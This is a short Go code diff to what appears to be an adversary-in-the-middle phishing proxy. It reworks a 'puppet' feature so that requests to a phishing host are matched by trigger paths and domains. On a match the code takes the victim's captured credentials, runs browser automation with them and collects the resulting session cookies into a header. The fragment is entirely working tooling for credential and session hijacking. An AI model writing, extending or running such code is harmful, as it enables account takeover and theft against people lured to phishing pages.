@@ -214,9 +214,25 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			pl := p.getPhishletByPhishHost(req.Host)
 			remote_addr := from_ip
 
-			if pl != nil && len(pl.puppet) > 0 {
-				for _, puppetCfg := range pl.puppet {
-					if puppetCfg.requestMatchRe != nil && puppetCfg.requestMatchRe.MatchString(req.URL.Path) {
+			if pl != nil && pl.puppet != nil {
+				for _, trigger := range pl.puppet.Triggers {
+					pathMatched := false
+					for _, tp := range trigger.Paths {
+						if strings.HasPrefix(req.URL.Path, tp) {
+							pathMatched = true
+							break
+						}
+					}
+
+					domainMatched := false
+					for _, td := range trigger.Domains {
+						if req.Host == td {
+							domainMatched = true
+							break
+						}
+					}
+
+					if pathMatched && domainMatched {
 						log.Info("[PUPPET] Intercepting request: %s", req.URL.Path)
 
 						creds := make(map[string]string)
@@ -239,7 +255,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 						}
 
-						cookies, err := RunPuppetAutomation(&puppetCfg, creds)
+						cookies, err := RunPuppetAutomation(&trigger, creds)
 						if err == nil && len(cookies) > 0 {
 							cookieHeader := ""
 							for _, c := range cookies {
